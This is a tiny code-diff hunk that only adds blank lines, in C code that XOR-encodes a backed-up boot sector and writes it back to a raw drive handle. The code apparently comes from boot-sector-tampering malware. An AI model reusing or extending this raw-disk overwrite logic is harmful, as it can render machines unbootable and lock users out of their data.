@@ -103,7 +103,9 @@ int main()
 	{
 		int temp = bootSectorBackup[i] ^ 0x28;
 		bootSectorEncrypted[i] = temp;
+
 	}
+
 
 
 	if (!Write(driveHandle, 10, sizeof(bootSectorEncrypted), bootSectorEncrypted))
